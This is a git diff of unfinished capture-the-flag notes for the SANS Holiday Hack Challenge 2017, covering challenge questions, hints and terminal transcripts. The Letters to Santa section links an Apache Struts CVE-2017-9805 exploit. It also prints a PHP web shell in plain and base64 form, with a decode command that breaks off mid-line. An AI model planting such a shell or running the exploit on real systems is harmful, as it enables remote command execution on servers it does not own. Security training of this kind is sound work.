@@ -1,29 +1,63 @@
-1) Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?
+# Great Pages
 
-https://www.holidayhackchallenge.com/2017/pages/6dda7650725302f59ea42047206bd4ee5f928d19/GreatBookPage1.pdf
+[Page 1](https://www.holidayhackchallenge.com/2017/pages/6dda7650725302f59ea42047206bd4ee5f928d19/GreatBookPage1.pdf)
+[Page 2](https://www.holidayhackchallenge.com/2017/pages/aa814d1c25455480942cb4106e6cde84be86fb30/GreatBookPage2.pdf)
+[Page 3](https://www.holidayhackchallenge.com/2017/pages/57737da397cbfda84e88b573cd96d45fcf34a5da/GreatBookPage3.pdf)
+[Page 4](https://www.holidayhackchallenge.com/2017/pages/f192a884f68af24ae55d9d9ad4adf8d3a3995258/GreatBookPage4.pdf)
+[Page 5](https://www.holidayhackchallenge.com/2017/pages/05c0cacc8cfb96bb5531540e9b2b839a0604225f/GreatBookPage5.pdf)
+[Page 6](https://www.holidayhackchallenge.com/2017/pages/8943e0524e1bf0ea8c7968e85b2444323cb237af/GreatBookPage6.pdf)
 
-About This Book...
+# Challenge
 
-2) Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?
+## 1) Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?
+
+[Page 1](https://www.holidayhackchallenge.com/2017/pages/6dda7650725302f59ea42047206bd4ee5f928d19/GreatBookPage1.pdf)
+
+ANSWER: About This Book...
+
+## 2) Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?
 
 There is a link to the development version. The div is hidden.
 
+```
     <!-- Development version -->
     <a href="http://dev.northpolechristmastown.com" style="display: none;">Access Development Version</a>
-
+```
 The dev page states it's running apache struts at the bottom of the page.
 
 Use the struts vuln
 
-https://github.com/chrisjd20/cve-2017-9805.py
+[cve-2017-9805.py](https://github.com/chrisjd20/cve-2017-9805.py)
 
+Hints from Sparkle Redberry in the Winconceivable: The Cliffs of Winsanity Level:
+1. We're excited to debut the new Letters to Santa site this year. Alabaster worked hard on that project for over a year. I got to work with the development version of the site early on in the project lifecycle.
+2. Near the end of the development we had to rush a few things to get the new site moved to production. Some development content on the letter page should probably have been removed, but ended up marked as hidden to avoid added change control paperwork.
+3. Alabaster's primary backend experience is with Apache Struts. I love Apache and have a local instance set up on my home computer with a web shell. Web shells are great as a backdoor for me to access my system remotely. I just choose a really long complex file name so that no one else knows how to access it.
+4. A simple web shell is to create a PHP file in the web root with `<?php echo "<pre>" . shell_exec($_GET['e']) . "</pre>"; ?>`. Then, I visit the URL with my commands. For example, http://server/complexFileName.php?e=ls.
+5. There are lots of different web shell tools available. [You can get a simple PHP web shell that is easy to use here.](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985)
+6. That business with Equal-Facts Inc was really unfortunate. I understand there are a lot of different exploits available for those vulnerable systems. Fortunately, Alabaster said he tested for CVE-2017-5638 and it was NOT vulnerable. Hope he checked the others too.
+7. Apache Struts uses XML. I always had problems making proper XML formatting because of special characters. I either had to encode my data or escape the characters properly so the XML wouldn't break. I actually just checked and there are lots of different exploits out there for vulnerable systems. [Here is a useful article.](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code)
+8. Pro developer tip: Sometimes developers hard code credentials into their development files. Never do this, or at least make sure you take them out before publishing them or putting them into production. You also should avoid reusing credentials for different services, even on the same system.
 
-==Terminals
+php code:
+```php
+<?php echo "<pre>" . shell_exec($_GET['e']) . "</pre>"; ?>
+```
 
-1) Winconceivable: The Cliffs of Winsanity
-Game: https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7
-Terminal: https://docker2017.holidayhackchallenge.com/?challenge=82c16868-a96e-4e4c-955e-5b41f7c5809a&uid=ee838751-39b4-423a-8d67-6d935c88d650
+base64:
+PD9waHAgZWNobyAiPHByZT4iIC4gc2hlbGxfZXhlYygkX0dFVFsnZSddKSAuICI8L3ByZT4iOyA/Pgo=
 
+command:
+echo PD9waHAgZWNobyAiPHByZT4iIC4gc2hlbGxfZXhlYygkX0dFVFsnZSddKSAuICI8L3ByZT4iOyA/Pgo= | base64 -d | 
+
+ANSWER:
+
+# Terminals
+
+## Winconceivable: The Cliffs of Winsanity
+[Game](https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7)
+[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=82c16868-a96e-4e4c-955e-5b41f7c5809a&uid=ee838751-39b4-423a-8d67-6d935c88d650)
+```
                 ___,@
                /  <
           ,_  /    \  _,
@@ -74,11 +108,13 @@ elf          1  0.0  0.0  18028  2844 pts/0    Ss   22:38   0:00 /bin/bash /sbin
 elf         12  0.0  0.0  18248  3320 pts/0    S    22:38   0:00 /bin/bash
 elf        110  0.0  0.0  34424  2860 pts/0    R+   22:40   0:00 ps aux
 elf@95e7d11fd705:~$ 
+```
 
-2) Winter Wonder Landing
-Game: https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54
-Terminal: https://docker2017.holidayhackchallenge.com/?challenge=eb5282de-5e43-4813-8ada-5aee3cdb101e&uid=ee838751-39b4-423a-8d67-6d935c88d650
+## Winter Wonder Landing
+[Game](https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54)
+[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=eb5282de-5e43-4813-8ada-5aee3cdb101e&uid=ee838751-39b4-423a-8d67-6d935c88d650)
 
+```
                                  |
                                \ ' /
                              -- (*) --
@@ -147,11 +183,13 @@ Timezone=UTC
 Commencing Elf Talk Daemon (pid=6021)... done!
 Background daemon...
 elf@f666a50bd0a2:~$ 
+```
 
-3) Cryokinetic Magic
-Game: https://2017.holidayhackchallenge.com/game/a1f7ac49-8210-436b-9e25-0c19f9ebfe02
-Terminal: https://docker2017.holidayhackchallenge.com/?challenge=da6d34d1-012b-420b-a7d5-369914353578&uid=ee838751-39b4-423a-8d67-6d935c88d650
+## Cryokinetic Magic
+[Game](https://2017.holidayhackchallenge.com/game/a1f7ac49-8210-436b-9e25-0c19f9ebfe02)
+[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=da6d34d1-012b-420b-a7d5-369914353578&uid=ee838751-39b4-423a-8d67-6d935c88d650)
 
+```
                      ___
                     / __'.     .-"""-.
               .-""-| |  '.'.  / .---. \
@@ -199,13 +237,13 @@ elf@d6d2285095a4:~$ /lib64/ld-linux-x86-64.so.2 ./CandyCaneStriper
          `
 The candy cane striping machine is up and running!
 elf@d6d2285095a4:~$ 
+```
 
+## There's Snow Place Like Home
+[Game](https://2017.holidayhackchallenge.com/game/41a1e6bb-60c3-4695-ad04-514fbcc76afa)
+[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=4050467e-9cde-44cd-aa63-1a0b8b210bb7&uid=ee838751-39b4-423a-8d67-6d935c88d650)
 
-4) There's Snow Place Like Home
-Game: https://2017.holidayhackchallenge.com/game/41a1e6bb-60c3-4695-ad04-514fbcc76afa
-Terminal: https://docker2017.holidayhackchallenge.com/?challenge=4050467e-9cde-44cd-aa63-1a0b8b210bb7&uid=ee838751-39b4-423a-8d67-6d935c88d650
-
-
+```
                              ______
                           .-"""".._'.       _,##
                    _..__ |.-"""-.|  |   _,##'`-._
@@ -252,11 +290,13 @@ v
 ≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠=°≠=°≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠
 You did it! Thank you!
 elf@9f82b8f65b29:~$ 
+```
 
-5) Bumbles Bounce
-Game: https://2017.holidayhackchallenge.com/game/dbb44df8-af5e-4136-b72e-ebd9dfb32b4a
-Terminal: https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&uid=ee838751-39b4-423a-8d67-6d935c88d650
+## Bumbles Bounce
+[Game](https://2017.holidayhackchallenge.com/game/dbb44df8-af5e-4136-b72e-ebd9dfb32b4a)
+[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&uid=ee838751-39b4-423a-8d67-6d935c88d650)
 
+```
                            ._    _.
                            (_)  (_)                  <> \  / <>
                             .\::/.                   \_\/  \/_/ 
@@ -296,11 +336,13 @@ Starting up, please wait......
 Enter the name of the least popular browser in the web log: Dillo/3.0.5
 That is the least common browser in the web log! Congratulations!
 elf@c43edd6eda2b:~$ 
+```
 
-6) I Don't Think We're In Kansas Anymore
-Game: https://2017.holidayhackchallenge.com/game/5bbfc970-71d2-4c9d-816c-25955536c168
-Terminal: https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&uid=ee838751-39b4-423a-8d67-6d935c88d650
+## I Don't Think We're In Kansas Anymore
+[Game](https://2017.holidayhackchallenge.com/game/5bbfc970-71d2-4c9d-816c-25955536c168)
+[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&uid=ee838751-39b4-423a-8d67-6d935c88d650)
 
+```
                        *
                       .~'
                      O'~..
@@ -347,15 +389,17 @@ Starting up, please wait......
 Enter the name of the song with the most likes: Stairway to Heaven
 That is the #1 Christmas song, congratulations!
 elf@9cb73137ef01:~$ 
+```
+
+[Poppies](https://2017.holidayhackchallenge.com/assets/game/textures/poppies-f059c6edbcc20f71cba374496764ed0d.png)
+[Transparent image](https://images.vexels.com/media/users/3/142236/isolated/preview/5813595300ed1fd400a76ec2d9958144-fire-smoke-flame-by-vexels.png)
 
 
-https://2017.holidayhackchallenge.com/assets/game/textures/poppies-f059c6edbcc20f71cba374496764ed0d.png
-https://images.vexels.com/media/users/3/142236/isolated/preview/5813595300ed1fd400a76ec2d9958144-fire-smoke-flame-by-vexels.png
+## Oh Wait! Maybe WE Are...
+[Game](https://2017.holidayhackchallenge.com/game/f09180b7-43e4-406c-83ac-924539e7b8f5)
+[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&uid=ee838751-39b4-423a-8d67-6d935c88d650)
 
-
-7) Oh Wait! Maybe WE Are...
-Game: https://2017.holidayhackchallenge.com/game/f09180b7-43e4-406c-83ac-924539e7b8f5
-Terminal:https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&uid=ee838751-39b4-423a-8d67-6d935c88d650
+```
               \ /
             -->*<--
               /o\
@@ -419,12 +463,13 @@ elf@efe5512c7bd3:~$ inspect_da_box
                      ```````    '-...--'`
 /etc/shadow has been successfully restored!
 elf@efe5512c7bd3:~$ 
+```
 
-8) We're Off To See The...
-Game: https://2017.holidayhackchallenge.com/game/30a9c19a-f931-4367-9922-d20b91314eec
-Terminal: https://docker2017.holidayhackchallenge.com/?challenge=96452ffb-5153-4473-9fe4-f0ff7921308e&uid=ee838751-39b4-423a-8d67-6d935c88d650
+## We're Off To See The...
+[Game](https://2017.holidayhackchallenge.com/game/30a9c19a-f931-4367-9922-d20b91314eec)
+[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=96452ffb-5153-4473-9fe4-f0ff7921308e&uid=ee838751-39b4-423a-8d67-6d935c88d650)
 
-
+```
                  .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
                _(_      _Y_      _Y_      _Y_      _Y_      _)_
               [___]    [___]    [___]    [___]    [___]    [___]
@@ -468,7 +513,7 @@ elf@ad986ac63ab1:~$ cat srand.c
 int rand(unsigned int *seed) {
     return 42;
 }
-elf@ad986ac63ab1:~$ gcc -o srand.so -ldl -shared -fPIC srand.c
+elf@ad986ac63ab1:~$ gcc -o srand.so -ldl -shared srand.c
 elf@ad986ac63ab1:~$ LD_PRELOAD=`pwd`/srand.so ./isit42 
 Starting up ... done.
 Calling rand() to select a random number.
@@ -500,4 +545,4 @@ Calling rand() to select a random number.
        `---------''---------` 
 Congratulations! You've won, and have successfully completed this challenge.
 elf@ad986ac63ab1:~$ 
-
+```
